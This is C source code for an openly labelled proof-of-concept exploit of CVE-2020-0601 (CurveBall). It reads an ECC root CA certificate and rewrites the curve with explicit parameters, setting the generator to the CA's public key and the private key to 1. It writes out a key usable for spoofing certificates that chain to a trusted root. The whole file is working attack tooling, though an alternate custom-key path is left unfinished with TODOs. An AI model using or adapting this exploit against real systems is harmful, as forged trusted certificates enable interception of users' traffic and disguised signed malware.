/*
 * CVE-2020-0601 - CurveBall PoC
 * Adam Podlosky <apodlosky@gmail.com>
 */

#include <assert.h>
#include <stdbool.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

#include <getopt.h>
#include <openssl/bio.h>
#include <openssl/bn.h>
#include <openssl/err.h>
#include <openssl/ec.h>
#include <openssl/evp.h>
#include <openssl/pem.h>
#include <openssl/x509.h>

#define DEFAULT_OUTPUT "spoof_ca.key"

static char* inputFile = NULL;
static char* outputFile = NULL;
static BIGNUM* optPrivateKey = NULL;
static bool optVerbose = false;

//
// Displays application usage.
//
void showUsage(const char *argv0)
{
    fprintf(stderr,
        "Usage: %s [-d <#>] [-v] <input> [output]\n"
        "\n"
        "Parameters:\n"
        "    -d <#>  - Specifiy private key value (decimal), defaults to 1\n"
        "    -v      - Verbose output\n"
        "   <input>  - Input CA root certificate\n"
        "   [output] - Output spoof certificate, defaults to " DEFAULT_OUTPUT "\n"
        "\n",
        argv0);
}

//
// Parses command-line arguments.
//
bool parseArgs(int argc, char *argv[])
{
    int opt;

    // Disable getopt warnings
    opterr = 0;

    while ((opt = getopt(argc, argv, "d:v")) != -1) {
        switch (opt) {
        case 'd':
            if (!BN_dec2bn(&optPrivateKey, optarg)) {
                fprintf(stderr, "error converting '%s': \n", optarg);
                ERR_print_errors_fp(stderr);
                return false;
            }
            break;
        case 'v':
            optVerbose = true;
            break;
        default:
            fprintf(stderr, "invalid parameter '-%c'\n", optopt);
            return false;
        }
    }

    switch (argc - optind) {
    case 2:
        inputFile = strdup(argv[optind]);
        outputFile = strdup(argv[optind + 1]);
        return true;
    case 1:
        inputFile = strdup(argv[optind]);
        outputFile = strdup(DEFAULT_OUTPUT);
        return true;
    default:
        return false;
    }
}

//
// Displays an OpenSSL error message after the specified prefix.
//
void showSslError(const char *prefix)
{
    printf("[!] Error, %s: ", prefix);
    ERR_print_errors_fp(stdout);
}

//
// Reads an X.509 certificate (PEM format) from the specified file.
// Note: The returned X509 pointer must be freed.
//
X509* readX509(const char *inputFile)
{
    BIO *fileIo;
    X509 *cert = NULL;

    fileIo = BIO_new(BIO_s_file());
    if (fileIo == NULL) {
        showSslError("BIO_new failed");
    }
    else {
        if (!BIO_read_filename(fileIo, inputFile)) {
            showSslError("BIO_read_filename failed");
        }
        else {
            cert = PEM_read_bio_X509(fileIo, NULL, 0, NULL);
            if (cert == NULL) {
                showSslError("PEM_read_bio_X509 failed");
            }
        }

        BIO_free(fileIo);
    }

    return cert;
}

//
// Determines if the given X509 certificate is ECC.
//
bool isX509Ec(X509 *cert)
{
    EVP_PKEY *publicKey;

    publicKey = X509_get0_pubkey(cert);
    if (publicKey == NULL) {
        showSslError("X509_get0_pubkey failed");
    }
    else if (EVP_PKEY_id(publicKey) == EVP_PKEY_EC) {
        return true;
    }

    return false;
}

//
// Determines if the given X509 ECC certificate uses GF(p).
//
bool isX509EcGFp(X509 *cert)
{
    EVP_PKEY *publicKey;

    publicKey = X509_get0_pubkey(cert);
    if (publicKey == NULL) {
        showSslError("X509_get0_pubkey failed");
    }
    else {
        // TODO: check equation is GFp based
        // get EC_GROUP and check method is not GF2m?
        return true;
    }

    return false;
}

//
// Retrieves the public key from an ECC certificate.
//
EC_KEY* getEcPublicKey(X509 *cert)
{
    EC_KEY *ecKey = NULL;
    EVP_PKEY *publicKey;

    publicKey = X509_get0_pubkey(cert);
    if (publicKey == NULL) {
        showSslError("X509_get0_pubkey failed");
    }
    else {
        ecKey = EVP_PKEY_get0_EC_KEY(publicKey);
        if (ecKey == NULL) {
            showSslError("EVP_PKEY_get0_EC_KEY failed");
        }
    }

    return ecKey;
}

//
// Modifies the EC key using Q=G and d=1.
//
bool setEcKeyFixed(EC_KEY *ecKey)
{
    EC_GROUP *ecGroup = NULL;
    const EC_GROUP *ecOrigGroup;
    const EC_POINT *pointGenerator;
    const BIGNUM *bnOrder;
    const BIGNUM *bnCofactor;
    const BIGNUM *privateKey;

    printf("  [-] Duplicating EC key group...\n");
    ecOrigGroup = EC_KEY_get0_group(ecKey);
    if (ecOrigGroup == NULL) {
        showSslError("EC_KEY_get0_group failed");
        goto error;
    }
    pointGenerator = EC_KEY_get0_public_key(ecKey);
    bnOrder = EC_GROUP_get0_order(ecOrigGroup);
    bnCofactor = EC_GROUP_get0_cofactor(ecOrigGroup);

    ecGroup = EC_GROUP_dup(ecOrigGroup);
    if (ecGroup == NULL) {
        showSslError("EC_GROUP_dup failed");
        goto error;
    }

    printf("  [-] Setting EC group to EXPLICIT...\n");
    EC_GROUP_set_asn1_flag(ecGroup, OPENSSL_EC_EXPLICIT_CURVE);

    printf("  [-] Setting EC group parameters...\n");
    if (!EC_GROUP_set_generator(ecGroup, pointGenerator, bnOrder, bnCofactor)) {
        showSslError("EC_GROUP_set_generator failed");
        goto error;
    }

    printf("  [-] Setting EC private key to 1...\n");
    privateKey = BN_value_one();
    if (!EC_KEY_set_private_key(ecKey, privateKey)) {
        showSslError("EC_KEY_set_private_key failed");
        goto error;
    }

    printf("  [-] Setting EC key to new group...\n");
    if (!EC_KEY_set_group(ecKey, ecGroup)) {
        showSslError("EC_KEY_set_group failed");
        goto error;
    }

    return true;

error:
    if (ecGroup != NULL) {
        EC_GROUP_free(ecGroup);
    }

    return false;
}

//
// Modifies the EC key using:
//  Q' = Q
//  d' = specified
//  G' = d'^-1 * G
//
bool setEcKeyCustom(EC_KEY *ecKey)
{
    const EC_GROUP *ecOrigGroup;
    const BIGNUM *bnOrder;
    const BIGNUM *bnCofactor;
    BIGNUM *bnA = NULL;
    BIGNUM *bnB = NULL;
    BIGNUM *bnP = NULL;
    EC_GROUP *ecGroup = NULL;
    EC_POINT *ptG = NULL;

    bnA = BN_new();
    bnB = BN_new();
    bnP = BN_new();
    if (bnA == NULL || bnB == NULL || bnP == NULL) {
        showSslError("BN_new failed");
        goto error;
    }

    printf("  [-] Retrieving parameters from EC group...\n");
    ecOrigGroup = EC_KEY_get0_group(ecKey);
    if (ecOrigGroup == NULL) {
        showSslError("EC_KEY_get0_group failed");
        goto error;
    }

    if (!EC_GROUP_get_curve(ecOrigGroup, bnP, bnA, bnB, NULL)) {
        showSslError("EC_GROUP_get_curve failed");
        goto error;
    }

    bnOrder = EC_GROUP_get0_order(ecOrigGroup);
    bnCofactor = EC_GROUP_get0_cofactor(ecOrigGroup);

    printf("  [-] Creating new EC group over GF(p)...\n");
    ecGroup = EC_GROUP_new_curve_GFp(bnP, bnA, bnB, NULL);
    if (ecGroup == NULL) {
        showSslError("EC_GROUP_new_curve_GFp failed");
        goto error;
    }

    EC_GROUP_set_asn1_flag(ecGroup, OPENSSL_EC_EXPLICIT_CURVE);

    printf("  [-] Calcuating generator point...\n");
    ptG = EC_POINT_new(ecGroup);
    if (ptG == NULL) {
        showSslError("EC_POINT_new failed");
        goto error;
    }

    // TODO:
    // temp = d^-1
    // G = d * Q

    // TODO: print G
    printf("  [-] Setting EC group generator to TODO...\n");
    if (!EC_GROUP_set_generator(ecGroup, ptG, bnOrder, bnCofactor)) {
        showSslError("EC_GROUP_set_generator failed");
        goto error;
    }

    // TODO: print d
    printf("  [-] Setting EC private key to TODO...\n");
    if (!EC_KEY_set_private_key(ecKey, optPrivateKey)) {
        showSslError("EC_KEY_set_private_key failed");
        goto error;
    }

    printf("  [-] Setting EC key to new group...\n");
    if (!EC_KEY_set_group(ecKey, ecGroup)) {
        showSslError("EC_KEY_set_group failed");
        goto error;
    }

    return true;

error:
    if (bnA != NULL) {
        BN_free(bnA);
    }
    if (bnB != NULL) {
        BN_free(bnB);
    }
    if (bnP != NULL) {
        BN_free(bnP);
    }
    if (ptG != NULL) {
        EC_POINT_free(ptG);
    }
    if (ecGroup != NULL) {
        EC_GROUP_free(ecGroup);
    }

    return false;
}

//
// Writes an EC key to the specified file in PEM format.
//
bool writeEcKey(EC_KEY *ecKey, char *outputFile)
{
    BIO *fileIo;
    bool result = false;

    fileIo = BIO_new(BIO_s_file());
    if (fileIo == NULL) {
        showSslError("BIO_new failed");
    }
    else {
        // BIO_write_filename() does not take a const char* for the path...
        if (!BIO_write_filename(fileIo, outputFile)) {
            showSslError("BIO_write_filename failed");
        }
        else {
            if (!PEM_write_bio_ECPrivateKey(fileIo, ecKey, NULL, NULL, 0, NULL, NULL)) {
                showSslError("PEM_write_bio_ECPrivateKey failed");
            }
            else {
                result = true;
            }
        }

        BIO_free(fileIo);
    }

    return result;
}

int main(int argc, char *argv[])
{
    int result = EXIT_FAILURE;
    X509 *cert = NULL;
    EC_KEY *ecKey = NULL;

    if (!parseArgs(argc, argv)) {
        showUsage(argv[0]);
        exit(EXIT_FAILURE);
    }

    assert(inputFile);
    assert(outputFile);

    printf("[*] CA Spoofer for CVE-2020-0601 by Adam Podlosky\n");

    printf("[-] Reading input certificate '%s'...\n", inputFile);
    cert = readX509(inputFile);
    if (cert == NULL) {
        goto cleanUp;
    }

    printf("[-] Validating X.509 certificate...\n");
    if (!isX509Ec(cert)) {
        printf("[!] Error, NOT an EC public certificate\n");
        goto cleanUp;
    }

    // TODO: implement check
    if (!isX509EcGFp(cert)) {
        printf("[!] Error, NOT an EC certificate using GF(p) curve\n");
        goto cleanUp;
    }

    printf("[-] Retrieving EC public key and parameters...\n");
    ecKey = getEcPublicKey(cert);
    if (ecKey == NULL) {
        goto cleanUp;
    }

    printf("[-] Modifying EC key per exploit..\n");
    if (optPrivateKey != NULL) {
        if (!setEcKeyCustom(ecKey)) {
            goto cleanUp;
        }
    }
    else if (!setEcKeyFixed(ecKey)) {
        goto cleanUp;
    }

    printf("[-] Writing output certificate '%s'...\n", outputFile);
    if (writeEcKey(ecKey, outputFile)) {
        printf("[*] Finished!\n");
        result = EXIT_SUCCESS;
    }

cleanUp:
    if (inputFile != NULL) {
        free(inputFile);
    }
    if (outputFile != NULL) {
        free(outputFile);
    }
    if (optPrivateKey != NULL) {
        BN_free(optPrivateKey);
    }
    if (cert != NULL) {
        X509_free(cert);
    }

    if (result != EXIT_SUCCESS) {
        printf("[*] Exiting with %d\n", result);
    }
    return result;
}
